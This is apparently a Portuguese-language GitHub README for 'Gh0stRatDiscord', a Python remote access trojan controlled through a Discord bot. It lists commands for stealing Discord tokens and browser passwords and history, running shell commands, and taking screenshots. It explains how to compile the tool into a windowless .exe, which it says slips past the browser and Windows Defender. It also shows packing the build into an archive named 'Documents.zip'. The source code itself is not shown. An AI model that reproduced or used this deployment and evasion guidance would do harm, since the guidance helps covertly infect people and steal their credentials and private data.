# Gh0stRatDiscord
Uma ferramenta de administração remota Python que funciona no Discord. Suporta vários comandos de exploração.

<br/>

## Discord Tokens
Devido a uma atualização do cliente pelo Discord em 2022, a maioria dos Token Grabbers não são mais eficazes. No entanto, esta ferramenta foi projetada para quebrar a criptografia atualizada do Discord.

<br/>

## Senhas do navegador
Esta ferramenta é capaz de extrair senhas de navegadores da web contemporâneos.

<br/>

## Lista de Comandos

```text 
help - Help command
ping - Ping command
cwd - Get current working directory
cd <path> - Change directory
ls - List directory
download <file> - Download file
upload <link> - Upload file
shell <ps> - Execute shell command
run <file> - Run an file
exit - Exit the session
screenshot - Take a screenshot
tokens - Get all discord tokens
shutdown - Shutdown the computer
restart - Restart the computer
passwords - Extracts all browser passwords
history - Extracts all browser history
```

<br/>

# Configuração de pacotes
### Instalando pacotes necessários
```python
pip install -r requirements.txt
```

# Configuração RAT
```python
guild_id = ""  # ID do canal/servidor do Discord
token = ""     # Token do Bot do Discord
```

<br/>

# Compilando em um executável (.exe)
Para converter um arquivo Python em um executável uma opção é utilizar o cx_Freeze. O cx_Freeze é uma ferramenta semelhante ao PyInstaller que pode ser usada para criar executáveis a partir de scripts Python.

<br/>

## 1 - Instalação do cx_Freeze:
você pode instalá-lo usando pip
```bash
pip install cx_Freeze
```
<br/>

## 2 - Criando um script de configuração:
Crie um arquivo chamado <code>setup.py</code> com as informações de configuração para o cx_Freeze. Aqui está um exemplo básico de um arquivo <code>setup.py</code>:
```bash
# script setup.py
from cx_Freeze import setup, Executable

# Nome e Descrição do executável.
nome_executavel = "MeuExecutavel"
descricao_executavel = "Descrição do seu executável"

# icon = define o icone do executável.
# base = Serve para criar um executável sem console.
executables = [Executable("main.py", base="Win32GUI", icon="icone.ico")]

setup(
    name=nome_executavel,
    version="1.0",
    description=descricao_executavel,
    executables=executables,
)
```

<br/>

```
# Certifique-se de passar o caminho do arquivo do ícone que você deseja usar. caso esteja em outra pasta:

icon="C:\Pasta1\Pasta2\icone.ico"
```

<br/>

## 2 - Execute o cx_Freeze compilando em um executável:
```bash
python setup.py build
```
### Usando cx_Freeze seu malwer passa pelo navegador e passa pelo Windows Defender na instalação e execução do (.exe)

<br/>

# Compilando em um arquivo (.zip)
```powershell
Compress-Archive -Path 'build' -DestinationPath 'C:\Users\***NAMEUSER***\Downloads\Documents.zip'
```
<br/>

# Bot do Discord
Certifique-se de estar logado no site do Discord.<br>
Navegue até a página de aplicações.
<hr/>
<h3> 
    Acesse o Link para criar seu Bot: <a targer="_blank" href="https://discord.com/developers">Discord Developers</a>
</h3>
<hr/>
       
###  Clique no botão "New Application" (Nova aplicação).       
<img width="300px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/c0498d2e-97f8-4f0a-bfa3-0c6ff1d995a9">
<br>
<hr/>

### Dê um nome à sua aplicação e clique em "Create" (Criar)
<img width="300px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/6518f879-bf4c-435b-ba38-e78a90ed9cf2">
<br>
<hr/>

### Vá até a guia "Bot" e clique em "Add Bot" (Adicionar bot). Você terá que confirmar, clicando em "Yes, do it!" (Sim, faça isso!).
<img width="610px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/962960eb-e175-439f-af56-335cb6a4b36a">
<br>
<hr/>

### Mantenha as configurações padrão para Public Bot (Bot público - marcada) e Require OAuth2 Code Grant (Exigir autorização de código OAuth2 - desmarcada).

Seu bot foi criado. A próxima etapa é copiar o token.

<img width="610px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/2af70800-900e-4757-8488-a0f662f0ce2a">
<br>
Este token é a senha do seu bot. Por isso, não o compartilhe com ninguém. Isso pode permitir que alguém faça o login com seu bot e faça o que quiser com ele. 
Você pode gerar novamente o token se ele for compartilhado por acidente.

<hr/>
<br>

# Como convidar seu bot para participar de um servidor

### Agora, você precisa colocar seu usuário bot em um servidor. Para fazer isso, crie um URL de convite para ele.
Vá para a guia "OAuth2" e selecione "bot" na seção "scopes" (Escopos).

<img width="610px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/c9bdba63-b866-4dbc-be54-cf4cd86c9059">

<br>

Em seguida, escolha as permissões que você quer que o bot tenha. O bot usará, principalmente, mensagens de texto. Assim, não precisamos de muitas permissões. Você pode precisar de mais, dependendo do que você quer que o bot possa fazer. Cuidado com a permissão de "Administrator" (Administrador).

<hr/>

<img width="610px" src="https://github.com/ghostn4444/Gh0stRatDiscord/assets/114788746/bee9f4d9-75f5-403a-89c2-3935ea1890fd">

<br>
<br>

### Depois de selecionar as permissões apropriadas, clique no botão 'copy' (Copiar) acima das permissões. Isso copiará o URL, que pode ser usado para adicionar o bot ao servidor.

Cole o URL em seu navegador, selecione um servidor para o qual você convidará o bot e clique em "Authorize" (Autorizar).

Para adicionar o bot, sua conta precisa da permissão "Manage Server" (Gerenciar servidor).
Agora que você criou o usuário bot, vamos começar a escrever o código em Python para ele.

<hr/>
